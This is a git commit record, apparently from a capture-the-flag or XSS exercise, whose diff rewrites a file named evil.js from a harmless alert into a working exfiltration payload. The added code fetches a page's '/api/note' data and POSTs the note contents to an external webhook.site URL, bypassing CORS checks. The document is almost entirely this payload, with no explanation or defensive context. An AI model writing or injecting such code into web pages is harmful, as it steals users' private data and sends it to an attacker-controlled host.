ef6dc8cda33baa51f8662173532092564bbc0154
Xabi <66421444+EzXabi@users.noreply.github.com>
2025-09-13 14:25:30 +0200

    test result?

--- evil.js
+++ evil.js
@@ -1,1 +1,9 @@
-alert("hi");
+fetch('/api/note')
+.then(r => r.json())
+.then(data => {
+  fetch('https://webhook.site/8687e340-2901-45ef-9a3a-c8e1ea8cfc32', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: data.note
+  });
+});
